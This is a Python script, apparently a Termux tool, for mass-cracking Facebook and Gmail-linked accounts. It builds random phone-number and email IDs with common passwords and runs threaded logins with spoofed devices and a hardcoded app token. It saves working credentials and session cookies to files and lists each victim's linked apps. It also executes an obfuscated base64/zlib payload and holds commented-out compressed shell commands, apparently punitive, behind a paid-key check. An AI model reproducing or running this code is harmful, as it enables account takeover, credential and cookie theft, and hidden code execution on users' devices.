#Created By Mr. Roki 
#WhatsApp : 01615161056
#CODE BY SAT SHAHIN YT
#CODE DESIGN BY SHAHIN ALAM
#CODE FOR RAKIB HASAN ROKI
import os,sys,time,json,random,re,string,platform,base64,uuid,base64,zlib,hashlib,subprocess
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu


try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as tred
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
tan=('https')
iya=('github')
ani=('ariya')
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for xd in range(30000):
    a='Nokia '
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku=(f'{a}{b}{c}{d}{e}{f}')
    ugen2.append(uaku)
nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]
    
exec(zlib.decompress(base64.b64decode("eJzLzVWwVdBQSsovMTQ1MTIwNbU0NrdydHQL8DBNLE6PNHGLLDUwNU9NynePMnIuLQ0PNa0oMfIuMFHSBADXLBCm")))
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Etisalat Af'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=1.5,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')



try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Etisalat Af"
                        sim_id+=fbcr
        else:
                fbcr = 'Etisalat Af'
                sim_id+=fbcr
except:
        fbcr = "Etisalat Af"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def clear():
	os.system('clear')
	print(logo)
def linex():
	print(47*'_')
loop = 0
oks = []
pcp=[]
cps=[]
#os.system('clear')
#print(logo)
## = input(' Put Your Network Name: ')
logo =("""''\33[m
________      ____   ___    __ ____      
`MMMMMMMb.   6MMMMb  `MM    d' `MM'      
 MM    `Mb  8P    Y8  MM   d'   MM       
 MM     MM 6M      Mb MM  d'    MM      \033[1;34m𝐏 \033[1;37m  
 MM     MM MM      MM MM d'     MM      \033[1;31m 𝐑\033[1;37m  
 MM    .M9 MM      MM MMd'      MM      \033[1;35m𝐎 \033[1;37m 
 MMMMMMM9' MM      MM MMYM.     MM      \033[1;34m𝐌 \033[1;37m 
 MM  \M\   MM      MM MM YM.    MM      \033[1;31m 𝐀\033[1;37m
 MM   \M\  YM      M9 MM  YM.   MM      \033[1;35m𝐗 \033[1;37m
 MM    \M\  8b    d8  MM   YM.  MM       
_MM_    \M\_ YMMMM9  _MM_   YM._MM_  
\033[1;31m 🌏[𝘽𝘼𝙉𝙂𝙡𝘼𝘿𝙀𝙎𝙃 𝘾𝙔𝘽𝙀𝙍 𝙆𝙄𝙉𝙂 𝙊𝙁𝙁 {𝐑𝟬𝐊𝟭}]😎\033[1;37m
'\33[m══════════════════════════════════════════════════
 Author    : 𝐌𝐑•𝐑𝟬𝐊𝟭
 Github    : ROKI-143-CYBER-KING
 Facebook  : RAKIB HASAN ROKI 
 Tool Type : RANDOM-PRO
 WhatsApp  : +8801317289813
\033[1;34m𝙄 𝙁𝙐𝘾𝙆 𝙔𝙊𝙐𝙍 𝘼𝙏𝙏𝙄𝙏𝙐𝘿𝙀 \033[1;37m
══════════════════════════════════════════════════""") 

def clear():
    os.system('clear')
    print(logo)

def x1():

  if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):

    print("Turn OFF protacton System")

    time.sleep(2)

    print("\n Run again : python Roki.py")

    time.sleep(5)

    exit()

def x2():

  file = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r")

  data = file.read()

  word =("print(url)")

  if word in data:

    print(' unknown error.,,,,, ')

    time.sleep(1)

    print(' tring to fix error,,,, ')
    os.system('pip uninstall requests -y')
    os.system('pip install requests')
    print (' Run again : python Roki.py')
    exit()

def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id ='Its-ROKI' +'→'.join(uuid)+str(os.getlogin())
  server = requests.get(f'https://github.com/Raki-404/Aprobel-Roki/blob/main/A.txt')
  x1()
  x2()
  try:
    httpCaht = requests.get(f"https://github.com/Raki-404/Aprobel-Roki/blob/main/A.txt").text
    if id in httpCaht:
      print(f"\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
      print(f" Your Key : {id}")
      print(f"    Send payment to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open {tan}://wa.me/+8801317289813?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()

def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id ='ROKI-FREE-NOT-ALLOW'
	server = requests.get(f'{tan}://{iya}.com/F{ani}122/vip/blob/main/a.txt').text
	try:
		httpCaht = requests.get(f"{tan}://{iya}.com/F{ani}122/vip/blob/main/b.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			fucked()
		else:
			msg = str(os.geteuid())
			pass
	except:
			sys.exit()

def fucked():
	print(' Chacking password,,,,,')
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print(' Access Done,,,,, ');time.sleep(1)
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	print(' Fuck You Bypass User ');exit()

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def sucrity():
	clear()
	print(" Chacking Your Aprobal,,,,,,,,,,,,")
	#server()
	menu_apikey()
	ckx()
	xnx=input(' Enter your password : ')
	if xnx in ["PAID-R-$","PAID-R-৳"]:
		pass
	else:
		exit()
#sucrity()



def menu():
	os.system('clear')
	print(logo)
	print('[1] Start Random Crack ')
	print('[2] Start File Cloning')
	print('[3] Gmail Cloning ')
	print('[0] Exit Menu')
	print(47*'_')
	opt = input('[?] Choose : ')
	if opt =='1':
		vx()
	elif opt =='2':
		file()
	elif opt =='3':
		gml()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91m [•] Choose valid option\033[0;97m')
def vx():
	clear()
	print(' [1] RANDOM METHOD (1)')
	print(' [2] RANDOM METHOD (2)')
	fv = input(' CHOICE : ')
	if fv =='1':
		v1()
	elif fv =='2':
		v2()
def file():
	clear()
	print(' [1] FILE CLONER API')
	print(' [2] FILE CLONER VIP')
	fc = input(' CHOICE : ')
	if fc =='1':
		file1()
	elif fc =='2':
		file2()
def gml():
	user=[]
	os.system("clear")
	print(logo)
	print(50*'_')
	ko = input(" Fast name : ")
	de = input(" Last name : ")
	limit = int(input('[?] CRACKING LIMITE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(2,6))
		user.append(nmp)
	with tred(max_workers=50) as yaari:
		os.system("clear")
		print(logo)
		print(50*'_')
		tl = str(len(user))
		print(f' Total ids : {tl}')
		print(' Wait for ids ')
		print(50*'_')
		for love in user:
			uid = ko+de+love+'@gmail.com'
			pwx = [ko,de,ko+de,ko+' '+de,ko+'123',ko+'1234',ko+'12345',ko+'@123','bangladesh','Bangla','@#@#@#','@@@###','i love you','free fire']
			#pwx = ['123890',uid,ko+kod,ko+kod+kode,uid[5:],uid[3:],uid[4:],'Bangladesg','bangladesh','i love you','bangla','Bangla','@#@#@#','@@@###','###@@@','free fire']
			yaari.submit(mumit2,uid,pwx,tl)
	print(47*"\n\033[1;37m-")
	print('[✓] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/ROKI-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/ROKI-CP.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')


def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            pass
def v1():
	user=[]
	os.system("clear")
	print(logo)
	print(50*'_')
	ko = input(" Sim Code : ")
	kod = ''.join(random.choice(string.digits) for _ in range(2))
	kode = ''.join(random.choice(string.digits) for _ in range(2))
	limit = int(input('[?] CRACKING LIMITE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=50) as yaari:
		os.system("clear")
		print(logo)
		print(50*'_')
		tl = str(len(user))
		print(f' Total ids : {tl}')
		print(' Wait for ids ')
		print(50*'_')
		for love in user:
			uid = ko+kod+kode+love
			pwx = ['123890','freefire',uid,ko+kod+kode,kode+love,kod+kode+love,'bangladesh','Bangladesh','i love you','Bnagla','@#@#@#']
			yaari.submit(mumit2,uid,pwx,tl)
def v2():
	user=[]
	os.system("clear")
	print(logo)
	print(50*'_')
	ko = input(" Sim Code : ")
	kod = ''.join(random.choice(string.digits) for _ in range(2))
	kode = ''.join(random.choice(string.digits) for _ in range(2))
	limit = int(input('[?] CRACKING LIMITE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=50) as yaari:
		os.system("clear")
		print(logo)
		print(50*'_')
		tl = str(len(user))
		print(f' Total ids : {tl}')
		print(' Wait for ids ')
		print(50*'_')
		for love in user:
			uid = ko+kod+kode+love
			#pwx = ['123890','freefire',uid,ko+kod+kode,kode+love,kod+kode+love,'bangladesh','Bangladesh','i love you','Bnagla','@#@#@#']
			pwx = [ko+kod+kode,kode+love]
			yaari.submit(rcrack,uid,pwx,tl)
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(nka)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[Mr.Roki-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(50*'_')
                print(f"\033[1;92m[Mr.Roki-OK] {cid}|{ps} \nCookie : {coki}")
                #print(f' Useragent : {pro}')
                open('/sdcard/Roki-OK.txt', 'a').write( cid+' | '+ps+'\n')
                cek_apk(session,coki)
                print(50*'_')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[Mr.Roki-CP] {cid}|{ps}")
                #print(f' Useragent : {pro}')
                open('/sdcard/Roki-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass


def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(nka)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[ROKI-DONE] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/ROKI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\r\r\x1b[1;36m [ROKI-LOCK] ' +cid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/ROKI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r\033[1;37m [ROKI-V1-RNDM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
def file1():
	clear()
	file = input(' Put file path\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(' File location not found ')
		time.sleep(1)
		main()
	clear()
	plist=[]
	try:
		ps_limit = int(input(' How many passwords do you want to add ? '))
	except:
		ps_limit =1
	linex()
	print('\033[1;32m exp: first last,firtslast,first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f' Put password {i+1}: '))
	linex()
	print(' Do you went show cp account? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=30) as crack_submit:
		clear()
		total_ids = str(len(fo))
		print(' Total ids : \033[1;32m'+total_ids)
		print("\033[1;31m The Burte Has Been Started Wait & Watch\033[1;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			crack_submit.submit(api,ids,names,passlist)
	print('\033[1;37m')
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	os.system('python X.py')


def api(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ROKI-API-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			fbrv = str(random.randint(111111111,999999999))
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.1.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.75,width=720,height=1529};FBLC/'+'pt_BR'+';FBRV/'+fbrv+';FBCR/'+'UNITEL'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+'com.facebook.katana;FBDV/'+model+';FBSV/'+fbsv+'.1.1;FBOP/1;FBCA/'+'armeabi-v7a:armeabi;]'
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
			if 'session_key' in po:
				uid = q['uid']
				tok = q['access_token']
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				print('\r\r\033[1;32m [ROKI-DONE] '+str(ids)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [ROKI-LOGE] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/-CP.txt','a').write(str(ids)+'|'+pas+'\n')
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		#print(e)
		pass

def file2():
	clear()
	me='1'
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' Put file path\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			exit()
		mthd='1'
		plist=[]
		try:
			ps_limit = int(input(f' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		print(f'\033[1;32m exp: first last, First Last, first123')
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		print(f' Do you went show cp account? (y/n): ')
		cx=input(f' Choose: ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
			print(f"\033[1;37m Use flight mode for speed up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb1,ids,names,passlist)
				else:
					crack_submit.submit(ffb1,ids,names,passlist)
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ROKI-VIP-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
